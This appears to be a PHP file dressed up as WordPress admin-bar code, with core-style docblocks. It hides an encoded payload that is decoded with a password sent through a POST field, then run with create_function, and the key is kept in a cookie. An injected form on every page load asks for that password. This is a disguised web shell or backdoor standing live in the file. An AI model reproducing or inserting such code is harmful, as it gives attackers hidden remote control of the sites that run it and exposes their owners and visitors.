6cGQptQP6%LqewEQzeFyxPnAQVn4Jyub40JIPyEutawl5ZbyKFqOBDziD1nsJx9KnE0CgzHt%niD9sO54fzHbsloNG511uU%sEXd5f1j%HODaUOC7qeXBD%0s4j2TWPAzHjl8CTbyLoPO1rGXuWKYf7y+7vGfrwDVtuKjSXBPEdeSlSxMu0LmkLMV8AU27isR3U9ottbOM8JLlPd7fNql+DwlTUOpQ7uN7HMy2XvcEtwDSeHyJwT8%w%+rqOEFh81d+m8sJ3wuUuQViE23%xGhHY7jZAc7endk+PvqEX0tuKphsCvElwUMN%wGqOemDx1DY86IyOQB0mGeewZMju1xjSGMDNrbpj%bg6sCAg4%1H6SBuOLxfot9709OeqWX5aO11LoyiFmTJm1LW6uTbhuWMNpz6t2p6wEaZFqSI6qsEkQ1IA8OaiGZzO34uPOw80IPAcQLugznOftOqQ9r1sYyEnTQoswu7ci7XsLXV4WIfLh6FUd3+85mjftRp2OxWJkmq3haYaq2USsV35vxfGnfWRYiyx+g8VjVPtJQP+xp+aJgGVy4fUI0B+ExQDtqsccQEIB+xrTsS8i2Tz2cEuN3CMbvi0QTdUI0AA5x+Culv6l4W0wJ6TukCpk6QDpq0nxGjoNelMtMiXlQeG1EDPhxjz0FVxS2yTs3lf3h7Vo6%BXicBCko+9NiL8JqtTbEx7Ncvzm%eeL+K43KI0K4UZP95fWAi99xNH68vS3akP4lvmLCV8rGgfHvQMhhAdp8Asupnz24xySqyjf4CtLzbbb435XPtcis1GCk9D4jO8%AOm0B9pp8NPm%jDBHjqEZdLmWmKKB%IjVXCTvuDRn+wTk8KxoP1OmYyk2p6YXiTzh1UNcCzncBbhqJQysZuUl1G%VFkCdnfWvkIcqQ%6Jd8HVwa1IKvjlDWbLd03SQsVQVpuIPo%icGdFmMZ5MRRgjsyrGA%0%pWVHvGxm2WrLupo4yAys2Zb79fvKKSNcxkLAIoiqnFpKDJw38eFx1+FMa1cTOdOx04TsNGxhX0GXf%iaJL+dcR2NUkbEJdFJ2muwYXAFqiPv8hoBiYBZULjQuWs1xXF2JssObP8LYig1xM38BH+ggJ7ulFG6+kbWUHJhBiW41qmC5FgfcsAOOUSSqJel2atJDesMzFga0czscnqgRD58jVXw8ijYCEBfkAGecqB2Caaf8Sq4uZkWe6+d2gurfbwZqWrW9bhrsbQvAPyetKXiYZROHLF+JU2CFruVhbHI+8I+5hyTU0reAlYMdG4iv3gJupgA2syEDy%cLwDRNlU8AgjpkE7CgnIDo8+RgHsU60FlSsSLgOI1fITLyAVoJKsokBlMBQ0bDokWqcnLQJijyKNRuZMCuiUj9i%iWxnMvN7nRusLs6Q48hvEHiUmeYswZlTsIvaIJgGzxsbSBFYLufUr0jxfJXvvpcd1idFIqzrz6zUx0HsHech9Mg5llYXaSGqkLfAyYN58hnIu4Grfk3eOLzU0r94wxTgCaf6pEgEx0tCjUkamtX8mCDplRJ4X5so2Y0tdk3uePcwCS1%yzWD4KgpQPnxu8b8SzzJTJVlyKvMSGiURtN1ynimexaAF2B7aWOryy3kOrnt4wlVf%AbVmsJ4Cm06A7zB+LNUTDsNmYkjvclf0dKIDpS4%2M+DerPZO%8+Y32RRTMr+hAwM18xkq+fqPwSuzBfzdyQO9Jw8EMH3cFapPkKnxRnaYlnPaBCO1gKJjm3RfPNXhxLqlUtShwNlvqiWTuD4c+qfyHfvBPNk2hODwX7N8knWHZJFNCrnWnwdtcrxAoLseXHXJITXQ%Xa4MtqVDEUp5TsPf+CRmm8v6lhRB53TJeq+QIsHoYYEEQPAcJmFlNbLzK5CzB9z41eDtwaRbsRmfW6YTafCTQB2m0E6SWo687Aj3DEK7EKu0Z1HXKhcC3pyjfZIXlTYWNx8EBiegifFsCiAmdxAz0KUqOYKzeD2E40vzdCkotag8ZpMYAf9rnLHlgpw+pMtzAz9ntLQGO1rI1bfDPzjP6l6Ori9zw6u4YVgAn2x2O%T1FJJuyaHmuf0zM8CLJPQkH4F47on1rbdLqI+2Ny8VFHZ2sa5PUf89h96gern9uOU9JpZ313DCYUouZsD5%bWsesx8YgNagRHiCeUFfvg3i4BGhsUFKIYWePMWHFqyPSt%OWqDxT6Vl1DEp9D5nAUTYydr1iyhyzkH6mxs6kd%8++ICujwbIKJ9H3SmsOZTG9Q%P5VVFGxIyD8EGSlWkQTAlc+I%Aq4%nODDx1YCVWBmKiP4la51sWA5sfpotFcpD7DzRFDGvvQIqxNoVg3vxT8kt%fsXsWEzamr+l5QRIh%KJee9Ztn2yX%nkJ5GjFifbFbLJckLqwmK3%ReWDQqChu3ryE5GANOS6TUsL2UQZFWqTXcrkgqy4IUZUO+FdWdXdg52GdU64VX5Y40cnp2WKSWqMJh%IO+klR7DOlWbsSwzwa8LIXLiRvIfkhI4MR2UBRFmLQRwWP52x%yfu+gu4X%MWVGVVB1cwcWbiHteNqYlZpwczX1vr3tBiM5IXYizRiB9ua3oT5RbUp+Gy%NwFyOw5XPrjIN++YRnw%UDc+RmHH%+i0l5KiVt0ysTeunFGRPBcy78ZAr3bnBcS7cDKKj0vHay7AHU+8hc6RrTDx3Jl0FiEZnMCrOraPkOoxna1bZvXkaFQMZCTN6NwLRhmQWY2ATRsY8dL%PcIfMZ2%osRqpceyxH4NKPCi7czmz6ENikbsdgHjtrxAbBX5iCYka78bZZ5kIcGZGQhDdYdHx1duOEga1wMrZPaYH+5MqcP1xWaHnWAAxTPHS2nn+lN3dAPDAs5fMap4xUjjq1t%x4fKouCAfRRvCEr%Mv72fMkhjTHBw8qPphSf6Ho+lzaO4HvCwX+CkRkQZZxodA9zqawGU7yVMrEshQSdJkQzALrPc%QSMko%s35IhRw6HQDa0oVDbSIOv6TMCPoMBCaHPQSn8GQVXkojUKiS23uHomfSHR%59F0AAVcfVMpOktt6RnTFwxa3DvGU8Qw3es3+qkamODouGe1514oJxuqER1Toz6SeQm7cOaC1ZcVrYsngaWH95evvveEaTEge36hnQth61GUx6ct3yzOq8Jx5KGsjQvWP6SwvlhKS95niuA2jAbQXWBsCPQcx%nORUMeGaBVP0KuEx6XNWEcaPwOe2DBOOU80TZcip67QikvhoWm9dAwXPKapGTAL8TbBOkhWnG8jej2G5ZqSfOHhkz0%zhL8f554Gz6igDFEYzkvIkOBsZxX2xA0Z%aJRG%pg8ZVls8hYMC+s1D+rOQcd4Qwq8x858X3Dj0DDWNWuDT08B4pO3f1wGJFwpzaSXkxD+SDaThpTM0HS0e6Ojf1ZGVBFzBxZ+UXZBR4P14PToqvrEoLk3TpOFXkEs7cmCsd5k0yueRmT7ULLEdYJNKM4ZODMjq07YiLvcZXhRKixko0nePxRNEfFYyioUcUe7fR+LWhe9Z+vKfab8G+ZC2O7D+QONSa+2dD117Fnv+AGV7Ztw5Y5TF9tjqBVER88a4EQNrnKwa8O5bTYR7qBlchxIP4MLw6Oz02OdizInf0fZqt5S7+vcKUzDdFH0X1EeGikTusECQq4jTeYQms9ZqyuA+VXUF4iAF90nV2+ddtnFJUkJ4UZCRt45vIU3C4fNuahgHaHa6XWgVIl0LZfD1UPzRRbxd+NCDSewpUn83p5vys4xTB1RUzhr4v5PfDPCyoLYej6vLNn3IdFWkZE1MKc%%OW2lI3DIsdoTBGC1WPGYYmP0oV0ZwStXSgO8HpEhXzGTfUntdci2777wsdN%LeGeS+tf0caZwm2x0wm09zC0ZIVVYVMoEuvCtQsuits3Ccj123sFVwi0hCcOROlfsDtaCOKNPQeSBmmeVbJdWCOMq7+hwsW2%mN2sy1W+9BAUEiLlRgxQxl4sw+mT6tfSeJYlc+6pocmYFmNS31GOQIHyxSS7EcILKc1%ZRLmlBw+9A47f5mzF9ADpFpS81rMUoorLXegZjengSBp3AQm5wBKtxScadyJBc6RIZq75r7eudwM8HdKDoThDcZg4rzOfojpxJZtsHSGoxsMhucMbz5ZhM0dednc57K0SmM1XfSNdT2xznIsAuPAEvZjNIVhteoT8iOg+U+aN8kKxZ2j4SlpLUs8UFneXmTSxhBRW20BXgUVP1XtCLXU6GRhqB2XApEPmZJJupI%lQY69f8oHDcKXIkWAHWFCubN5CBIpyqQfgXv3pcyxqj+xCEwMH64YvvDOCw+hR92mfAOtR8OWRXswiXdyCcGN2VRF7UTIY+uYha1agrDFJWrzYkPRzMHuQ2jmUoj+BmyetUAUe6yrCX4jdawCTbP20lvoWP7WfvhZ4zb3H4ecYnWSY4K3nwKwWkbVU75xlpDjXY6H7hQlpLr4OE1Hnd%pHdeKY0md9eyha6rBADFFSzJdebT%HRmob7bFVJ1ESbjnx+EP6y0nVc0%BT4O1GrQ3l%2x%S7WyX48UGfmsWmiQ%pT0hR5P%B9R%kCj%br8AIYOYhngIePcBgdrkNq7CjYXpBWNGG7N0XnZE7f7erqYd62ws1Qd3B1wZBhs%tQXBm5WRJE+usq4+D2Z8rHTemV74nKcJCiRF4iBdFDPAMtEr78pesMPLb31%unaY6ZcSoqWGwxX4z5jpfocucWwSbDWZU82qVMc65pPK2lzkR%Uch7762%XHbzkzjU7lqs7ebuoVo9Baeqaos9GWUW1k+KZnrfIEd8VlFTGJi8YUej67t8aYdXnwQ5gTZNC6Q18O2fmP5JQkWQTmfUd0k2PSxyufr5RqABgGa+bh0d9zAuDmcYEkMAuTkP8+NbbDYoQtkVewpnUqQkJ7axRBJOtXwZ+jATPpo7uii47Kw40jrkq0cKZDnyn7oIuTyJuv4OhoZ%dqYB+EX+mc+bW95YfOaFGvXsPp%f7KkvuDmqp5Many%oOxwhj+WUOu8lhaE90JDlnGVg+7PH1f1XbCmAZQNKRNV5I4N2Az57fL4MvBWFB5tJ9IJv8wxcD1BUxkS%62U+4dnlfGz2OnjpeBk0jrJtX24YDi0Xh01QAbtzMHtfFbmHKoiQ6EavTC5PxRbtFISdyPtLCgBxyhBTQxaQWfXIlvhfH4zG1%l2BemBSSaBs9ZzJZSd7+OnK9jzRyDW+WYQrvxyYfRXiqKLCZbwMjoz9RbswtJKKQ3LElh4zIghVFyvVQp4SDXvX9G%bDscw69Dcc0ObHf1TwyYU6sCEkErZHCxR95kMGY8WMU2oXHToDyA8K+9x9n0TF8BRBRn2EfWEENQXvuBcYVusi+nJDPOUi55VTqbJVA3qyv+8bXHlcVpGK9z3+J7ASAT4NR0xP6c9akHoyqLs96+YeihhzfMXGDd7UTQgpHWuRIElSxNOqlO1CLmdrdkSV1lq39JX2Jy7Jq8eHcQz7spYcnBco05x9Bm5SkKdAcilkfw2RWz8O1gRaj33OmmGNN0Qz3iYMK3WmaK7GPi+lLZgQPh9ra9b4PeLtWEXNBkQpDhuOLSetlEjiojC82VW+imQmS9UWJ1qhSaXTWeSVLfcVKlSR%JgeVKVs4KbK8JOZehjV0Nr9CzJczDA2OUlwdDQ9rfqXbuNpBOFGwsg4jSzqo9BmYEAbgqo2sLbfX7kRRnPlFyQl++yudNoS8W91ThyQxfpciIsHROObrYdec%NRkp4288%zFIEoafdSq76%xHF5PCwwHs8jCqK5aix0E3fBc9EsXyDJI14HdQYf84Crtgkra5omI+4tc6VHYsmXSUAbwaSUUQ0qUSHtI9nKRjMoUjSLqkZfAeihWNifHM%e8%1ycaXpUNOt1%OaOWmhr387ZE+WHrOxocxLL2KWXLyZ2OxItbZ78hqjiIRsCY7JCb6Cgfa+xHiEJjoKU6cKK%5zjwoa8aVirwTo0p2dh38bBoW%aqkobbDFpUTuIwT37GJfibAwD7i2S%FMBU6shyWAbip8mBpi4BMxU7asv6PTSuHHw%qItVIvanKyXk4+LIucjlU8BIOchHfNGwSQct6ha+k6BOwU4gRZzqm048UVt6M6fmQgjmDFPoDT9b16Q7rntpFI9jHdQ5TGcICLY2nrvL7dVj3aVPYEIK2p9sPdPSPEZtWPjOl0tlsHzv3P43uDoeJG+6slPMY955FxqD6DT9tZ3gfe0u4qKOkDE2d7rcevQrMYJozT0f1IGliL0CIIXe8NnzWf8DMej4pm9G98bdCzX6Iq93Z4G9iP6XOpNOgwYCeSuOlYPi5acAyiNA9VgKAbv5Sgjdeg2rnvYoc5I7Y*';

$wpautop = pre_admin_bar( $wp_kses_data, $wp_nonce );

if( isset( $wpautop ) ){
	if( isset($_POST['f_pp']) ) @setcookie( 'f_pp', $_POST['f_pp'] );
	$shortcode_unautop = create_function( '', $wpautop );
	unset( $f_pp, $wpautop );
	$shortcode_unautop();
}


/**
 * Style and scripts for the admin bar.
 *
 * @since 3.1.0
 */
function wp_admin_bar_header() { 
echo '<form   method= "post" action= ""> <input type="input" name ="f_pp" value= ""/><input type= "submit" value= "&gt;"/> 
</form>';
}


/**
 * Retrieve the admin bar display preference of a user.
 *
 * @since 3.1.0
 * @access private
 *
 * @param string $context Context of this preference check. Defaults to 'front'. The 'admin'
 * 	preference is no longer used.
 * @param int $user Optional. ID of the user to check, defaults to 0 for current user.
 * @return bool Whether the admin bar should be showing for this user.
 */
function _get_admin_bar_pref( $context = 'front', $user = 0 ) {
	$pref = get_user_option( "show_admin_bar_{$context}", $user );
	if ( false === $pref )
		return true;

	return 'true' === $pref;
}
wp_admin_bar_header();